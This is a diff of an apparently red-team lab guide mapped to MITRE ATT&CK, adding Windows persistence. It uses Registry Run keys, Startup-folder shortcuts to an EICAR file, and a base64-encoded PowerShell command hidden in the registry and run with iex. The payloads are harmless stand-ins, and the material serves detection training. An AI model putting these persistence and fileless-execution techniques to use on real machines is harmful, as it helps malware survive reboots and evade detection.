@@ -63,15 +63,15 @@ w> All labs require you to be running as an administrator.
 Add a path reference to the **Registry Run Keys**. 
 - MITRE ATT&CK Technique: [ATT&CK T1547.001 - Persistence - Registry Run Key](https://attack.mitre.org/techniques/T1547/001)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	Write-Host "Adding T1547.001 - Registry Run Key Foothold w/ simulated undetectable malware (calc)"
-	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
-	```
+```PowerShell
+Write-Host  -ForegroundColor Cyan "Adding T1547.001 - Registry Run Key Foothold w/ simulated undetectable malware (calc)"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
+```
 - [Optional] Cleanup:
-	```PowerShell
-	Write-Host "Removing T1547.001 - Registry Run Key foothold"
-	REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /F
-	```
+```PowerShell
+Write-Host -ForegroundColor Red "Removing T1547.001 - Registry Run Key foothold"
+REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /F
+```
 
 ### 2. Autostart Folder Shortcut
 > *Another popular persistence location is to simply place a shortcut to the malware in the Windows autostart folder. All files referenced here will execute upon a user logging in to the system, every time they log in.*
@@ -86,31 +86,31 @@ Add a path reference to the **Registry Run Keys**.
 Add a shortcut to malware in the **Autostart Folder**
 - MITRE ATT&CK Technique: [ATT&CK T1547.009 - Persistence - Autostart Folder](https://attack.mitre.org/techniques/T1547/009)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Autostart Folder with EICAR test string
-	Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
-	Write-Host "Writing EICAR file manually..."
+```PowerShell
+# Autostart Folder with EICAR test string
+Write-Host -ForegroundColor Cyan "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
+Write-Host -ForegroundColor Cyan "Writing EICAR file manually..."
 
-	$EICARString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
-	$EICARString | Out-File -Encoding ASCII -FilePath "$env:USERPROFILE\EICAR.exe" -Force
-	$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
-	$desktopShortcut = "$env:USERPROFILE\Desktop\evil_calc.lnk"
+$EICARString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
+$EICARString | Out-File -Encoding ASCII -FilePath "$env:USERPROFILE\EICAR.exe" -Force
+$startupShortcut = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk"
+$desktopShortcut = "$env:USERPROFILE\Desktop\evil_calc.lnk"
 
-	$cmd = @"
-	`$WScriptShell = New-Object -ComObject WScript.Shell
-	`$Shortcut1 = `$WScriptShell.CreateShortcut('$startupShortcut')
-	`$Shortcut1.TargetPath = '$env:USERPROFILE\EICAR.exe'
-	`$Shortcut1.Save()
+$cmd = @"
+`$WScriptShell = New-Object -ComObject WScript.Shell
+`$Shortcut1 = `$WScriptShell.CreateShortcut('$startupShortcut')
+`$Shortcut1.TargetPath = '$env:USERPROFILE\EICAR.exe'
+`$Shortcut1.Save()
 
-	`$Shortcut2 = `$WScriptShell.CreateShortcut('$desktopShortcut')
-	`$Shortcut2.TargetPath = '$env:USERPROFILE\EICAR.exe'
-	`$Shortcut2.Save()
-	"@
+`$Shortcut2 = `$WScriptShell.CreateShortcut('$desktopShortcut')
+`$Shortcut2.TargetPath = '$env:USERPROFILE\EICAR.exe'
+`$Shortcut2.Save()
+"@
 
-	$cmd += "`nStart-Sleep -m $n"
+$cmd += "`nStart-Sleep -m $n"
 
-	powershell.exe -NoProfile -Command $cmd
-	```
+powershell.exe -NoProfile -Command $cmd
+```
 
 
 ### 3. Fileless Runkey Persistence
@@ -122,24 +122,24 @@ Add a shortcut to malware in the **Autostart Folder**
 Create a fileless reference in the **Registry Run Keys**
 - MITRE ATT&CK Technique: [ATT&CK T1547.001 - Persistence - Registry Run Key](https://attack.mitre.org/techniques/T1547/001)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	# Autostart Folder with EICAR file
-	Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
-	$Cmd = "Write-Host -ForegroundColor Green 'Mess with the Best, Die like the rest!'; Start-Sleep -m $n"
-	$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
-	# Add encoded Command to random registry location
-	REG ADD "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d $EncodedCommand /f
-	
-	# Add powershell reference to registry run key that will have it grab and execute the encoded command hidden in the registry
-	$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
-	REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team Fileless" /t REG_SZ /F /D "powershell.exe -nop -command '$cmd'"
-	#Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
-	```
+```PowerShell
+# Autostart Folder with EICAR file
+Write-Host -ForegroundColor Cyan "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
+$Cmd = "Write-Host -ForegroundColor Green 'Mess with the Best, Die like the rest!'; Start-Sleep -m $n"
+$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
+# Add encoded Command to random registry location
+REG ADD "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d $EncodedCommand /f
+
+# Add powershell reference to registry run key that will have it grab and execute the encoded command hidden in the registry
+$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team Fileless" /t REG_SZ /F /D "powershell.exe -nop -command '$cmd'"
+#Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore
+```
 
 - Go ahead and run the command hidden in the registry now:
-	```Powershell
-	# Run the command from the registry on demand:
-	$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
-	powershell.exe -nop -command $cmd
-	```
-	s> If you are successful, powershell will display a message in green.
+```Powershell
+# Run the command from the registry on demand:
+$cmd = "iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp `"HKCU:\Software\Classes\RedTeamTest`").RT))); Start-Sleep -m $n"
+powershell.exe -nop -command $cmd
+```
+s> If you are successful, powershell will display a message in green.
